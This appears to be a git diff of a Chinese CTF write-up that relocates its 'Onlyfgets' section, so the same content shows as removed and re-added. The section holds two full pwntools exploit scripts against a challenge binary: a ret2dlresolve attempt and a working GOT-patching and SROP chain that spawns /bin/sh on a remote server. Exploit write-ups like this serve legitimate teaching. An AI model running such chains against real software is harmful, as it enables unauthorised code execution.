@@ -6,233 +6,6 @@ category: CTF
 draft: false
 ---
 
-# Onlyfgets
-
-![image-20260126170725649](./1.png)
-
-一开始写了一个ret2dl，把system解析到got.fgets上
-
-这个脚本本地能通，但是docker和远程都不通
-
-（不是patchelf的问题）
-
-没搞清楚docker内的调试，花费了很多时间，仍然不知道问题
-
-```python
-from pwn import *
-
-context(arch='amd64', os='linux')
-context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
-file = './onlyfgets'
-elf = ELF(file)
-libc = ELF('./libc.so.6')
-
-choice = 0
-# port =   8889
-# target = '127.0.0.1'
-port =   16538
-target = '60.205.163.215'
-if choice:
-    p = remote(target, port)
-else:
-    # p = process(file)
-    p = process(["./ld-linux-x86-64.so.2", "--library-path", "./", file])
-
-io = p
-
-def debug(cmd=''):
-    if choice==1:
-        return
-    gdb.attach(p, gdbscript=cmd)
-
-def get_pid(process_name):
-    ps_output = subprocess.check_output(['ps', '-a']).decode('utf-8')
-    lines = ps_output.splitlines()
-    for line in lines:
-        if process_name in line:
-            pid = line.split()[0]
-            if pid.isdigit():
-                return pid
-    return None
- 
-def gdbremote(pid, name = 'n1j:onlyfgets', port = '10000', ip = '127.0.0.1'):
-    os.system("gnome-terminal -- bash -c \"docker exec -it " + name + " gdbserver :" + port + " --attach " + pid + " \"")
-    os.system("gnome-terminal -- bash -c \"gdb -ex \\\"target remote " + ip + ":" + port + "\\\" \"")
-
-s       = lambda data               :p.send(data)
-sl      = lambda data               :p.sendline(data)
-sa      = lambda x,data             :p.sendafter(x, data)
-sla     = lambda x,data             :p.sendlineafter(x, data)
-r       = lambda num=4096           :p.recv(num)
-rl      = lambda num=4096           :p.recvline(num)
-ru      = lambda x                  :p.recvuntil(x)
-itr     = lambda                    :p.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
-uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
-uru64   = lambda                    :uu64(ru('\x7f')[-6:])
-leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
-
-pause()
-
-# debug('set follow-fork-mode parent\nb *0x4011F0')
-# gdbremote(get_pid("onlyfgets"))
-
-pause()
-
-ropp = ROP(elf)
-bss = elf.bss(0xb00)
-
-ret2dl = Ret2dlresolvePayload(elf, 'system', [], 0x404b60, elf.got['fgets'])
-ropp.ret2dlresolve(ret2dl)
-
-payload = b'A'*32 + p64(bss) + p64(0x4011DD)
-assert b'\x0a' not in payload
-sl(payload)
-
-pause()
-
-payload = b'A'*32 + p64(bss-0x300) + p64(0x4011DD) + ret2dl.payload + b'sh\x00'
-assert b'\x0a' not in payload
-sl(payload)
-
-pause()
-
-payload = b'A'*32 + p64(bss+0x88-0x10)
-payload += ropp.chain() + p64(0x4011DD)
-assert b'\x0a' not in payload
-sl(payload)
-
-itr()
-```
-
-后来搜了一下，发现有原题...然后去学习了一下
-
-大部分ELF都有`__do_global_dtors_aux`，对这条指令从中间进入可以解析为一个magic gadget
-
-![image-20260126170428614](./2.png)
-
-![image-20260126170052835](./3.png)
-
-如果程序有`__libc_csu_init`，就可以轻易控制`rbp`和`rbx`，从而进行任意地址写，不过这里没有
-
-这题特殊点在于`fgets`执行后，`rdx`会被设置为`stdin`的`_flag` (0xfbad208b)
-
-同时有两个控制`rbx`的gadget
-
-![image-20260126170510312](./4.png)
-
-![image-20260126170648822](./5.png)
-
-而libc中`execve`在`alarm`下方，`ssignal`下方有`syscall <SYS_rt_sigreturn>`
-
-于是可以结合三个gadget，把got.alarm改为execve，got.signal改为syscall sigreturn
-
-注意最后直接跳转到plt.signal，避免压入的返回地址对srop造成影响
-
-```python
-from pwn import *
-
-context(arch='amd64', os='linux')
-context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
-file = './patched'
-elf = ELF(file)
-libc = ELF('./libc.so.6')
-
-choice = 1
-# port =   8889
-# target = '127.0.0.1'
-port =   54556
-target = '60.205.163.215'
-if choice:
-    p = remote(target, port)
-else:
-    p = process(file)
-    # p = process(["/home/ctf/onlyfgets/ld-linux-x86-64.so.2", "--library-path", "/home/ctf/onlyfgets", "/home/ctf/onlyfgets/onlyfgets"])
-
-io = p
-
-def debug(cmd=''):
-    if choice==1:
-        return
-    gdb.attach(p, gdbscript=cmd)
-
-s       = lambda data               :p.send(data)
-sl      = lambda data               :p.sendline(data)
-sa      = lambda x,data             :p.sendafter(x, data)
-sla     = lambda x,data             :p.sendlineafter(x, data)
-r       = lambda num=4096           :p.recv(num)
-rl      = lambda num=4096           :p.recvline(num)
-ru      = lambda x                  :p.recvuntil(x)
-itr     = lambda                    :p.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
-uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
-uru64   = lambda                    :uu64(ru('\x7f')[-6:])
-leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
-
-# debug('b *0x4011F0')
-
-pause()
-
-ret = 0x4011fd
-pop_rdi_ret = 0x4011fc
-pop_rbp_ret = 0x40114d
-xor_rbx_ret = 0x4011FE
-add_bl_dh_ret = 0x4010ae         # rbx ebx bx bh/bl | rdx edx dx dh/dl
-add_rbp_3d_ebx_ret = 0x40114c
-
-# rdx = 0xfbad208b | dh = 0x20
-# rbx = 0 => 0xc0
-
-# 0x73c31efcc540 <alarm>
-# + 0xb40 = 0xc0*15
-# 0x73c31efcd080 <execve>
-
-payload = [b'\x00'*0x28]
-payload += [add_bl_dh_ret]*6
-payload += [pop_rbp_ret, elf.got['alarm']+0x3d]
-payload += [add_rbp_3d_ebx_ret]*15
-payload += [elf.sym['main']]
-
-sl(flat(payload))
-pause()
-
-# rdx = 0xfbad208b | dh = 0x20
-# rbx = 0 => 0x80
-
-# 0x73c31ef24420 <ssignal>
-# + 0x100 = 0x80*2
-# 0x73c31ef24520  mov rax, 0xf
-# 0x73c31ef24527  syscall <SYS_rt_sigreturn>
-
-payload = [b'\x00'*0x28, xor_rbx_ret]
-payload += [add_bl_dh_ret]*4
-payload += [pop_rbp_ret, elf.got['signal']+0x3d]
-payload += [add_rbp_3d_ebx_ret]*2
-payload += [elf.sym['main']]
-
-sl(flat(payload))
-pause()
-debug('b *0x4011F0')
-bss = 0x404500
-
-sl(flat(b'\x00'*0x20, bss-0x20, 0x4011DD))
-pause()
-
-frame = SigreturnFrame()
-frame.rsp = bss
-frame.rdi = 0x4044c0
-frame.rip = 0x4011cd
-
-payload = flat(b'/bin/sh\x00', b'\x00'*0x20, elf.plt['signal'], bytes(frame))
-sl(payload)
-
-itr()
-```
-
-
-
 # ez_canary
 
 ![image-20260126171530938](./6.png)
@@ -644,3 +417,227 @@ s(fake_io)
 itr()
 ```
 
+# Onlyfgets
+
+![image-20260126170725649](./1.png)
+
+一开始写了一个ret2dl，把system解析到got.fgets上
+
+这个脚本本地能通，但是docker和远程都不通
+
+（不是patchelf的问题）
+
+没搞清楚docker内的调试，花费了很多时间，仍然不知道问题
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux')
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+file = './onlyfgets'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+choice = 0
+# port =   8889
+# target = '127.0.0.1'
+port =   16538
+target = '60.205.163.215'
+if choice:
+    p = remote(target, port)
+else:
+    # p = process(file)
+    p = process(["./ld-linux-x86-64.so.2", "--library-path", "./", file])
+
+io = p
+
+def debug(cmd=''):
+    if choice==1:
+        return
+    gdb.attach(p, gdbscript=cmd)
+
+def get_pid(process_name):
+    ps_output = subprocess.check_output(['ps', '-a']).decode('utf-8')
+    lines = ps_output.splitlines()
+    for line in lines:
+        if process_name in line:
+            pid = line.split()[0]
+            if pid.isdigit():
+                return pid
+    return None
+ 
+def gdbremote(pid, name = 'n1j:onlyfgets', port = '10000', ip = '127.0.0.1'):
+    os.system("gnome-terminal -- bash -c \"docker exec -it " + name + " gdbserver :" + port + " --attach " + pid + " \"")
+    os.system("gnome-terminal -- bash -c \"gdb -ex \\\"target remote " + ip + ":" + port + "\\\" \"")
+
+s       = lambda data               :p.send(data)
+sl      = lambda data               :p.sendline(data)
+sa      = lambda x,data             :p.sendafter(x, data)
+sla     = lambda x,data             :p.sendlineafter(x, data)
+r       = lambda num=4096           :p.recv(num)
+rl      = lambda num=4096           :p.recvline(num)
+ru      = lambda x                  :p.recvuntil(x)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
+uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
+uru64   = lambda                    :uu64(ru('\x7f')[-6:])
+leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
+
+pause()
+
+# debug('set follow-fork-mode parent\nb *0x4011F0')
+# gdbremote(get_pid("onlyfgets"))
+
+pause()
+
+ropp = ROP(elf)
+bss = elf.bss(0xb00)
+
+ret2dl = Ret2dlresolvePayload(elf, 'system', [], 0x404b60, elf.got['fgets'])
+ropp.ret2dlresolve(ret2dl)
+
+payload = b'A'*32 + p64(bss) + p64(0x4011DD)
+assert b'\x0a' not in payload
+sl(payload)
+
+pause()
+
+payload = b'A'*32 + p64(bss-0x300) + p64(0x4011DD) + ret2dl.payload + b'sh\x00'
+assert b'\x0a' not in payload
+sl(payload)
+
+pause()
+
+payload = b'A'*32 + p64(bss+0x88-0x10)
+payload += ropp.chain() + p64(0x4011DD)
+assert b'\x0a' not in payload
+sl(payload)
+
+itr()
+```
+
+后来搜了一下，发现有原题...然后去学习了一下
+
+大部分ELF都有`__do_global_dtors_aux`，对这条指令从中间进入可以解析为一个magic gadget
+
+![image-20260126170428614](./2.png)
+
+![image-20260126170052835](./3.png)
+
+如果程序有`__libc_csu_init`，就可以轻易控制`rbp`和`rbx`，从而进行任意地址写，不过这里没有
+
+这题特殊点在于`fgets`执行后，`rdx`会被设置为`stdin`的`_flag` (0xfbad208b)
+
+同时有两个控制`rbx`的gadget
+
+![image-20260126170510312](./4.png)
+
+![image-20260126170648822](./5.png)
+
+而libc中`execve`在`alarm`下方，`ssignal`下方有`syscall <SYS_rt_sigreturn>`
+
+于是可以结合三个gadget，把got.alarm改为execve，got.signal改为syscall sigreturn
+
+注意最后直接跳转到plt.signal，避免压入的返回地址对srop造成影响
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux')
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+file = './patched'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+choice = 1
+# port =   8889
+# target = '127.0.0.1'
+port =   54556
+target = '60.205.163.215'
+if choice:
+    p = remote(target, port)
+else:
+    p = process(file)
+    # p = process(["/home/ctf/onlyfgets/ld-linux-x86-64.so.2", "--library-path", "/home/ctf/onlyfgets", "/home/ctf/onlyfgets/onlyfgets"])
+
+io = p
+
+def debug(cmd=''):
+    if choice==1:
+        return
+    gdb.attach(p, gdbscript=cmd)
+
+s       = lambda data               :p.send(data)
+sl      = lambda data               :p.sendline(data)
+sa      = lambda x,data             :p.sendafter(x, data)
+sla     = lambda x,data             :p.sendlineafter(x, data)
+r       = lambda num=4096           :p.recv(num)
+rl      = lambda num=4096           :p.recvline(num)
+ru      = lambda x                  :p.recvuntil(x)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
+uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
+uru64   = lambda                    :uu64(ru('\x7f')[-6:])
+leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
+
+# debug('b *0x4011F0')
+
+pause()
+
+ret = 0x4011fd
+pop_rdi_ret = 0x4011fc
+pop_rbp_ret = 0x40114d
+xor_rbx_ret = 0x4011FE
+add_bl_dh_ret = 0x4010ae         # rbx ebx bx bh/bl | rdx edx dx dh/dl
+add_rbp_3d_ebx_ret = 0x40114c
+
+# rdx = 0xfbad208b | dh = 0x20
+# rbx = 0 => 0xc0
+
+# 0x73c31efcc540 <alarm>
+# + 0xb40 = 0xc0*15
+# 0x73c31efcd080 <execve>
+
+payload = [b'\x00'*0x28]
+payload += [add_bl_dh_ret]*6
+payload += [pop_rbp_ret, elf.got['alarm']+0x3d]
+payload += [add_rbp_3d_ebx_ret]*15
+payload += [elf.sym['main']]
+
+sl(flat(payload))
+pause()
+
+# rdx = 0xfbad208b | dh = 0x20
+# rbx = 0 => 0x80
+
+# 0x73c31ef24420 <ssignal>
+# + 0x100 = 0x80*2
+# 0x73c31ef24520  mov rax, 0xf
+# 0x73c31ef24527  syscall <SYS_rt_sigreturn>
+
+payload = [b'\x00'*0x28, xor_rbx_ret]
+payload += [add_bl_dh_ret]*4
+payload += [pop_rbp_ret, elf.got['signal']+0x3d]
+payload += [add_rbp_3d_ebx_ret]*2
+payload += [elf.sym['main']]
+
+sl(flat(payload))
+pause()
+debug('b *0x4011F0')
+bss = 0x404500
+
+sl(flat(b'\x00'*0x20, bss-0x20, 0x4011DD))
+pause()
+
+frame = SigreturnFrame()
+frame.rsp = bss
+frame.rdi = 0x4044c0
+frame.rip = 0x4011cd
+
+payload = flat(b'/bin/sh\x00', b'\x00'*0x20, elf.plt['signal'], bytes(frame))
+sl(payload)
+
+itr()
+```
